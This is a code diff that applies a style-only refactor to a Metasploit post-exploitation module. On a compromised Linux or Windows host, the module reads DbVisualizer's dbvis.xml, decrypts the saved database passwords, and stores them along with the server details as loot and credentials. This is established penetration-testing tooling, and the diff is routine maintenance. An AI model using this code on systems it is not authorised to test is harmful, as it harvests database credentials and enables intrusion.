@@ -22,7 +22,7 @@ class MetasploitModule < Msf::Post
         },
         'License' => MSF_LICENSE,
         'Author' => [ 'David Bloom' ], # Twitter: @philophobia78
-        'Platform' => %w{linux win},
+        'Platform' => %w[linux win],
         'SessionTypes' => [ 'meterpreter', 'shell'],
         'Compat' => {
           'Meterpreter' => {
@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Post
       user = session.shell_command('whoami').chomp
       print_status("Current user is #{user}")
       if user =~ /root/
-        user_base = "/root/"
+        user_base = '/root/'
       else
         user_base = "/home/#{user}/"
       end
@@ -58,9 +58,9 @@ class MetasploitModule < Msf::Post
       if session.type == 'meterpreter'
         user_profile = session.sys.config.getenv('USERPROFILE')
       else
-        user_profile = cmd_exec("echo %USERPROFILE%").strip
+        user_profile = cmd_exec('echo %USERPROFILE%').strip
       end
-      dbvis_file = user_profile + "\\.dbvis\\config70\\dbvis.xml"
+      dbvis_file = user_profile + '\\.dbvis\\config70\\dbvis.xml'
     end
 
     unless file?(dbvis_file)
@@ -71,7 +71,7 @@ class MetasploitModule < Msf::Post
       when 'linux'
         dbvis_file = "#{user_base}.dbvis/config/dbvis.xml"
       when 'windows'
-        dbvis_file = user_profile + "\\.dbvis\\config\\dbvis.xml"
+        dbvis_file = user_profile + '\\.dbvis\\config\\dbvis.xml'
       end
       unless file?(dbvis_file)
         print_error("File not found: #{dbvis_file}")
@@ -81,8 +81,8 @@ class MetasploitModule < Msf::Post
     end
 
     print_status("Reading: #{dbvis_file}")
-    print_line()
-    raw_xml = ""
+    print_line
+    raw_xml = ''
     begin
       raw_xml = read_file(dbvis_file)
     rescue EOFError
@@ -105,32 +105,32 @@ class MetasploitModule < Msf::Post
       print_line
       print_line(db_table.to_s)
       print_good('Try to query listed databases with dbviscmd.sh (or .bat) -connection <alias> -sql <statements> and have fun!')
-      print_line()
+      print_line
       # Store found databases in loot
       p = store_loot('dbvis.databases', 'text/csv', session, db_table.to_csv, 'dbvis_databases.txt', 'dbvis databases')
-      print_good("Databases settings stored in: #{p.to_s}")
+      print_good("Databases settings stored in: #{p}")
     end
 
     print_status("Downloading #{dbvis_file}")
-    p = store_loot("dbvis.xml", "text/xml", session, read_file(dbvis_file), "#{dbvis_file}", "dbvis config")
-    print_good "dbvis.xml saved to #{p.to_s}"
+    p = store_loot('dbvis.xml', 'text/xml', session, read_file(dbvis_file), dbvis_file.to_s, 'dbvis config')
+    print_good "dbvis.xml saved to #{p}"
   end
 
   # New config file parse function
   def parse_new_config_file(raw_xml)
     db_table = Rex::Text::Table.new(
-      'Header' => "DbVisualizer Databases",
+      'Header' => 'DbVisualizer Databases',
       'Indent' => 2,
       'Columns' =>
       [
-        "Alias",
-        "Type",
-        "Server",
-        "Port",
-        "Database",
-        "Namespace",
-        "UserID",
-        "Password"
+        'Alias',
+        'Type',
+        'Server',
+        'Port',
+        'Database',
+        'Namespace',
+        'UserID',
+        'Password'
       ]
     )
 
@@ -146,60 +146,60 @@ class MetasploitModule < Msf::Post
 
       if line =~ /<Database id=/
         dbfound = true
-      elsif line =~ /<\/Database>/
+      elsif line =~ %r{</Database>}
         dbfound = false
         if db[:Database].nil?
-          db[:Database] = "";
+          db[:Database] = ''
         end
         if db[:Namespace].nil?
-          db[:Namespace] = "";
+          db[:Namespace] = ''
         end
         # save
-        dbs << db if (db[:Alias] and db[:Type] and db[:Server] and db[:Port])
+        dbs << db if (db[:Alias] && db[:Type] && db[:Server] && db[:Port])
         db = {}
       end
 
-      if dbfound == true
-        # get the alias
-        if line =~ /<Alias>([\S+\s+]+)<\/Alias>/i
-          db[:Alias] = $1
-        end
+      next unless dbfound == true
 
-        # get the type
-        if line =~ /<Type>([\S+\s+]+)<\/Type>/i
-          db[:Type] = $1
-        end
+      # get the alias
+      if line =~ %r{<Alias>([\S+\s+]+)</Alias>}i
+        db[:Alias] = ::Regexp.last_match(1)
+      end
 
-        # get the user
-        if line =~ /<Userid>([\S+\s+]+)<\/Userid>/i
-          db[:UserID] = $1
-        end
+      # get the type
+      if line =~ %r{<Type>([\S+\s+]+)</Type>}i
+        db[:Type] = ::Regexp.last_match(1)
+      end
 
-        # get user password
-        if line =~ /<Password>([\S+\s+]+)<\/Password>/i
-          enc_password = $1
-          db[:Password] = decrypt_password(enc_password)
-        end
+      # get the user
+      if line =~ %r{<Userid>([\S+\s+]+)</Userid>}i
+        db[:UserID] = ::Regexp.last_match(1)
+      end
 
-        # get the server
-        if line =~ /<UrlVariable UrlVariableName="Server">([\S+\s+]+)<\/UrlVariable>/i
-          db[:Server] = $1
-        end
+      # get user password
+      if line =~ %r{<Password>([\S+\s+]+)</Password>}i
+        enc_password = ::Regexp.last_match(1)
+        db[:Password] = decrypt_password(enc_password)
+      end
 
-        # get the port
-        if line =~ /<UrlVariable UrlVariableName="Port">([\S+\s+]+)<\/UrlVariable>/i
-          db[:Port] = $1
-        end
+      # get the server
+      if line =~ %r{<UrlVariable UrlVariableName="Server">([\S+\s+]+)</UrlVariable>}i
+        db[:Server] = ::Regexp.last_match(1)
+      end
 
-        # get the database
-        if line =~ /<UrlVariable UrlVariableName="Database">([\S+\s+]+)<\/UrlVariable>/i
-          db[:Database] = $1
-        end
+      # get the port
+      if line =~ %r{<UrlVariable UrlVariableName="Port">([\S+\s+]+)</UrlVariable>}i
+        db[:Port] = ::Regexp.last_match(1)
+      end
 
-        # get the Namespace
-        if line =~ /<UrlVariable UrlVariableName="Namespace">([\S+\s+]+)<\/UrlVariable>/i
-          db[:Namespace] = $1
-        end
+      # get the database
+      if line =~ %r{<UrlVariable UrlVariableName="Database">([\S+\s+]+)</UrlVariable>}i
+        db[:Database] = ::Regexp.last_match(1)
+      end
+
+      # get the Namespace
+      if line =~ %r{<UrlVariable UrlVariableName="Namespace">([\S+\s+]+)</UrlVariable>}i
+        db[:Namespace] = ::Regexp.last_match(1)
       end
     end
 
@@ -207,7 +207,7 @@ class MetasploitModule < Msf::Post
     dbs.each do |db|
       if ::Rex::Socket.is_ipv4?(db[:Server].to_s)
         print_good("Reporting #{db[:Server]}")
-        report_host(:host => db[:Server]);
+        report_host(host: db[:Server])
       end
 
       db_table << [ db[:Alias], db[:Type], db[:Server], db[:Port], db[:Database], db[:Namespace], db[:UserID], db[:Password] ]
@@ -250,50 +250,49 @@ class MetasploitModule < Msf::Post
 
       if line =~ /<Database id=/
         dbfound = true
-      elsif line =~ /<\/Database>/
+      elsif line =~ %r{</Database>}
         dbfound = false
         # save
-        dbs << db if (db[:Alias] and db[:Url])
+        dbs << db if (db[:Alias] && db[:Url])
         db = {}
       end
 
-      if dbfound == true
-        # get the alias
-        if line =~ /<Alias>([\S+\s+]+)<\/Alias>/i
-          db[:Alias] = $1
-        end
+      next unless dbfound == true
 
-        # get the type
-        if line =~ /<Type>([\S+\s+]+)<\/Type>/i
-          db[:Type] = $1
-        end
+      # get the alias
+      if line =~ %r{<Alias>([\S+\s+]+)</Alias>}i
+        db[:Alias] = ::Regexp.last_match(1)
+      end
 
-        # get the user
-        if line =~ /<Userid>([\S+\s+]+)<\/Userid>/i
-          db[:UserID] = $1
-        end
+      # get the type
+      if line =~ %r{<Type>([\S+\s+]+)</Type>}i
+        db[:Type] = ::Regexp.last_match(1)
+      end
 
-        # get the user password
-        if line =~ /<Password>([\S+\s+]+)<\/Password>/i
-          enc_password = $1
-          db[:Password] = decrypt_password(enc_password)
-        end
+      # get the user
+      if line =~ %r{<Userid>([\S+\s+]+)</Userid>}i
+        db[:UserID] = ::Regexp.last_match(1)
+      end
 
-        # get the server URL
-        if line =~ /<Url>(\S+)<\/Url>/i
-          db[:URL] = $1
-        end
+      # get the user password
+      if line =~ %r{<Password>([\S+\s+]+)</Password>}i
+        enc_password = ::Regexp.last_match(1)
+        db[:Password] = decrypt_password(enc_password)
+      end
 
+      # get the server URL
+      if line =~ %r{<Url>(\S+)</Url>}i
+        db[:URL] = ::Regexp.last_match(1)
       end
     end
 
     # Fill the tab
     dbs.each do |db|
-      if (db[:URL] =~ /[\S+\s+]+[\/]+([\S+\s+]+):[\S+]+/i)
-        server = $1
+      if (db[:URL] =~ %r{[\S+\s+]+/+([\S+\s+]+):[\S+]+}i)
+        server = ::Regexp.last_match(1)
         if ::Rex::Socket.is_ipv4?(server)
           print_good("Reporting #{server}")
-          report_host(:host => server)
+          report_host(host: server)
         end
       end
       db_table << [ db[:Alias], db[:Type], db[:URL], db[:UserID], db[:Password] ]
@@ -310,9 +309,9 @@ class MetasploitModule < Msf::Post
 
   def find_version(tag)
     found = false
-    if tag =~ /<Version>([\S+\s+]+)<\/Version>/i
+    if tag =~ %r{<Version>([\S+\s+]+)</Version>}i
       found = true
-      print_good("DbVisualizer version: #{$1}")
+      print_good("DbVisualizer version: #{::Regexp.last_match(1)}")
     end
     found
   end
@@ -327,7 +326,7 @@ class MetasploitModule < Msf::Post
     }
 
     credential_data = {
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       session_id: session_db_id,
       origin_type: :session,
       private_data: opts[:password],
@@ -337,7 +336,7 @@ class MetasploitModule < Msf::Post
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
     create_credential_login(login_data)
